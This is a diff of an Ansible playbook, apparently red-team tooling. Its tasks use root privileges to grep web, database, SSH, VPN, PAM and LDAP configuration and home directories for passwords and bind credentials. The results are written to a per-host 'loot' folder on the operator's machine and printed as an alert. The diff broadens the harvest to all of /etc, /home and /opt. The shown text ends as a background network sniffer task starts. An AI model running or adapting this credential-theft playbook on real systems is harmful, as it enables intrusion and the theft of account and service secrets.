@@ -1,41 +1,42 @@
 ---
-# SECTION 1: DATABASE & WEB CREDENTIALS (Target: SCP-APACHE-01, SCP-DATABASE-01)
+# SECTION 1: DATABASE & WEB CREDENTIALS
 - name: Extract Database and Web Credentials
   become: yes
   shell: |
-    # Searches /var/www and /etc/mysql for DB/Web credentials.
-    # Specifically excludes the core WordPress directories that cause "noise".
-    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]{3,40}['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
-    | grep -vE "(wp-includes/|wp-admin/|node_modules/|vendor/|js/|css/|.svg|.png)" \
+    # Reduced filtering: Now scans all of /var/www and /etc/mysql
+    # Only excludes binary assets and node_modules
+    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
+    | grep -vE "(\.png|\.jpg|\.svg|\.gif|node_modules/|vendor/)" \
     | sort -u
   register: db_results
   failed_when: false
   changed_when: false
 
-# SECTION 2: SYSTEM & SERVICE CREDENTIALS (Target: SCP-OPENSSH-01, SCP-OPENVPN-01)
+# SECTION 2: SYSTEM & SERVICE CREDENTIALS
 - name: Extract System and VPN Credentials
   become: yes
   shell: |
-    # Scans /etc/ssh and /etc/openvpn for cleartext secrets, keys, or auth configs.
-    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{3,40}['\"]?" /etc/ssh /etc/openvpn /etc/pam.d /home 2>/dev/null \
-    | grep -vE "(\.js|passwd: files|passwd: False|No matches)" \
+    # Broadened search to include all of /etc and /home
+    # Captures any assignment to password-like keys
+    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /etc /home 2>/dev/null \
+    | grep -vE "(passwd: files|passwd: False|\.js|\.css)" \
     | sort -u
   register: system_results
   failed_when: false
   changed_when: false
 
-# SECTION 3: AD/LDAP BIND INFO (Target: SCP-DC-01 connectivity)
+# SECTION 3: AD/LDAP BIND INFO
 - name: Extract AD and LDAP Bind Info
   become: yes
   shell: |
-    # Scans for LDAP/AD bind credentials often used for centralized auth on Linux nodes.
-    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc/sssd /etc/ldap /etc/samba /etc/autofs 2>/dev/null \
+    # Global search for AD/LDAP strings across the entire filesystem
+    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc /var/www /opt 2>/dev/null \
     | sort -u
   register: ad_bind_results
   failed_when: false
   changed_when: false
 
-# SECTION 4: DELIVERY (Saves to local loot folder)
+# SECTION 4: DELIVERY
 - name: Deliver Organized Service Loot
   delegate_to: localhost
   copy:
@@ -52,9 +53,8 @@
       {{ ad_bind_results.stdout if ad_bind_results.stdout != "" else "None found" }}
     dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
   become: no
-  when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""
 
-# SECTION 5: LIVE ALERT (Terminal Output)
+# SECTION 5: LIVE ALERT
 - name: CATEGORIZED LOOT ALERT
   debug:
     msg:
@@ -64,9 +64,8 @@
       - "{{ system_results.stdout_lines | default(['None']) }}"
       - "--- AD BIND INFO ---"
       - "{{ ad_bind_results.stdout_lines | default(['None']) }}"
-  when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""
 
-# SECTION 6: NETWORK SNIFFER (Run once on Red Workstation)
+# SECTION 6: NETWORK SNIFFER
 - name: Start Background Network Sniffer
   delegate_to: localhost
   run_once: true
